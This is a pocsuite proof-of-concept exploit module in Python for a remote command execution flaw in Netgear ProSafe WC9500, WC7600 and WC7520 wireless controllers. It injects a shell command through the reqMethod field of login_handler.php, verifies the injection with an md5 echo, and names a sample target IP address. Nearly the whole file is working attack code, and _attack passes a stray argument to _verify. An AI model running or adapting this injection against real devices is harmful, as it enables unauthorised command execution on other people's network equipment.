#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import string


class TestPOC(POCBase):
    name = "Netgear ProSafe RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'RCE'
    version = '1.0'  # default version: 1.0
    references = 'http://firmware.re/vulns/acsa-2015-002.php'
    desc = 'Module exploits remote command execution vulnerability in Netgear ProSafe,WC9500, WC7600, WC7520 devices. If the target is vulnerable command shell is invoked.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Netgear'
    appVersion = 'WC9500,WC7600,WC7520'
    dork = 'WC9500,WC7600,WC7520'
    appPowerLink = 'http://www.netgear.com/'
    samples = ['http://80.41.24.205']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + "/login_handler.php"
        mark = ''.join(random.sample(string.ascii_letters + string.digits, 12))
        md5 = hashlib.md5()
        md5.update(mark)
        md5hash = md5.hexdigest()
        cmd = "echo -n {}|md5sum".format(mark)
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData";{}; echo {}'.format(cmd, mark)
        resp = req.post(url,data=data,headers=headers)

        if resp.status_code == 200 and md5hash in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
